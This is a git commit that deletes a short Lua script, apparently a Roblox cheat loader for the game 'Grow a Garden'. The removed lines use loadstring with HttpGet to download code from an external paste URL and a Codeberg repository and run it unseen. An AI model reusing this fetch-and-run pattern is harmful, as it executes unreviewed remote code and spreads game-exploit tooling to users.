ea4611127bb2ae519ac9753d681f937faa7cb154
Ziadian <heeza9546@gmail.com>
2025-07-24 19:18:35 +0700

    Delete growagardenscript.lua

--- growagardenscript.lua
+++
@@ -1,3 +0,0 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/PrgKkUmyirMQhNb1/raw", true))()
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/DarkBackup/script/raw/branch/main/loadstring"))()
-Spawner.Load()
